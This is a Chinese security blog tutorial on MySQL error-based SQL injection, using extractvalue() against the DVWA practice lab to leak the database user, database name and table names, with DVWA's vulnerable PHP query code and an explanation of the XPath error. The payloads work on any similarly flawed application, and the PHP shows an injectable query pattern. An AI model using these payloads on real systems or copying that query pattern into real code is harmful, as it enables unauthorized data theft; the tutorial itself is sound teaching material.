---
title: SQL注入系列篇 | 报错注入
url: https://www.secpulse.com/archives/199935.html
source: 安全脉搏
date: 2023-05-07
fetch_date: 2025-10-04T11:37:11.116044
---

# SQL注入系列篇 | 报错注入

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# SQL注入系列篇 | 报错注入

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[第59号实验室](https://www.secpulse.com/newpage/author?author_id=49738)

2023-05-06

23,107

## 一：报错注入概念

数据库在执行SQL语句时，通常会先对SQL进行检测,如果SQL语句存在问题,就会返回错误信息。通过这种机制，我们可以构造恶意的SQL，触发数据库报错，而在报错信息中就存在着我们想要的信息。但通过这种方式，首先要保证SQL结构的正确性。
例如：在mysql中执行
**select \* from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e));**
这条语句本身结构存在问题,缺少右括号，所以还未进入到查询阶段就返回结构性错误，这不是我们想要的报错

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199935-1683339031.png)

当添加上右括号时
**select \* from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));**
mysql检查SQL结构没有问题，正常进入查询阶段，而在查询阶段时出错，此时报错信息就可能出现我们想要的信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199935-1683339032.png)

## 二：报错注入流程

在这里我们还是以dvwa为靶机做报错注入演示
**http://192.168.230.204/dvwa/vulnerabilities/sqli/?id=1#&Submit=Submit#**
在union联合注入篇我们已经确定在id这个参数点为单引号字符，后台SQL含有2列值，具体可参考union联合注入篇。接下来我们可以通过报错注入的方式来获取我们想要的信息。构造输入 **1’ and (extractvalue(1,concat(0x7e,(select user()),0x7e))) #**
1’ 部分是与后台SQL的单引号做闭合
extractvalue函数是对XML文档进行查询的函数,需要两个参数(目标xml文档,xml路径)
如

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199935-1683339033.png)

# 部分注释掉后半部分未知SQL
执行输入，得到以下结果

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199935-16833390331.png)

1' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) #

错误信息中爆出数据库当前用户名
修改输入**1’ and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199935-1683339034.png)

1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #

错误信息中爆出当前数据库名
修改输入**1’ and (extractvalue(1,concat(0x7e,(select group\_concat(table\_name) from information\_schema.tables where table\_schema = database()),0x7e))) #**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199935-16833390341.png)

1' and (extractvalue(1,concat(0x7e,(select group\_concat(table\_name) from information\_schema.tables where table\_schema = database()),0x7e))) #

错误信息中爆出当前数据库下的所有表名: users 和 guestbook
适当修改SQL语句即可完全爆出对应数据表中数据

## 三：报错函数及原理剖析

本次报错演示利用的是extractvalue函数，其实在mysql中还有很多类似的函数，如updatexml，exp，multipoint等，都有类似的效果，在接下来的注入系列文章会做统一的讲解。今天我们先来看一下extractvalue函数报错后为何会把数据库信息泄露出来
我们以**1’ and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #**为例
后台的处理程序如下

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 ``` | ``` <?php  if( isset( $_REQUEST[ 'Submit' ] ) ) {     // Get input     $id = $_REQUEST[ 'id' ];      // Check database     $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";     $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );      // Get results     $num = mysql_numrows( $result );     $i   = 0;     while( $i < $num ) {         // Get values         $first = mysql_result( $result, $i, "first_name" );         $last  = mysql_result( $result, $i, "last_name" );          // Feedback for end user         echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";          // Increase loop count         $i++;     }      mysql_close(); }  ?> ``` |

由此可知拼接所得的SQL为

|  |  |
| --- | --- |
| ``` 1 ``` | ``` SELECT first_name, last_name FROM users WHERE user_id = '1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #' ``` |

在数据库中执行

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-199935-1683339035.png)

extractvalue(xml\_document,xpath\_string)，这个函数用于在xml格式文件中查询。需要两个输入参数，第一个为xml文件内容或文件路径，第二个为xpath格式
如 exractvalue(‘<a><b/></a>’,’/a/b’)
我们构造的输入中
extractvalue(1,concat(0x7e,(select database()),0x7e))，第一个参数为1，第二个参数为concat(0x7e,(select database()),0x7e)
在进入数据库后，数据库首先检查该SQL结构是否完整，是否缺少参数，此例中SQL结构完好
然后在进行解析，检测函数调用过程中参数格式是否正确，在解析到参数二时，select database() 解析为 ‘dvwa’，然后通过concat连接成~dvwa~，最终检测~dvwa~是否满足xpath格式
在这次注入中，~dvwa~明显不满足xpath格式，因此数据库报错提示格式错误

## 四：后台SQL及拼接后的原型

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` 1' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) # SELECT first_name, last_name FROM users WHERE user_id = '1' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) #';  1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) # SELECT first_name, last_name FROM users WHERE user_id = '1' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) #';  1' and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e))) # SELECT first_name, last_name FROM users WHERE user_id = '1' and (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e))) #'; ``` |

## 五：总结

报错注入是通过构造恶意SQL，使数据库报错，从报错信息中得到敏感信息的方法。如果服务器应用没有对这种错误进行处理，则攻击者可以通过页面的错误回显获取数据。

下一期将介绍时间注入

往期推荐：

[扫盲帖 | SQL注入简介](http://mp.weixin.qq.com/s?__biz=MzI0NDgxMzgxNA==&mid=2247483970&idx=1&sn=f2a5409e53c4b7f8bcb37cbf210dc724&chksm=e95958dbde2ed1cda1cfe5a2b91fa55441d1b8f2cd968872529160f033ff31d866ff21e5a484&scene=21#wechat_redirect)

[SQL注入系列篇之union联合注入](http://mp.weixin.qq.com/s?__biz=MzI0NDgxMzgxNA==&mid=2247484018&idx=1&sn=0fe37437c702b3aa823453979fbbdf88&chksm=e95958ebde2ed1fd52c8c010253a17b067f5901f115ceeeafd1d160dff1955da0bd883706834&scene=21#wechat_redirect)

**本文作者：[第59号实验室](newpage/author?author_id=49738)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/199935.html**](https://www.secpulse.com/archives/199935.html)

Tags: [exp](https://www.secpulse.com/archives/tag/exp)、[extractvalue函数](https://www.secpulse.com/archives/tag/extractvalue%E5%87%BD%E6%95%B0)、[mu...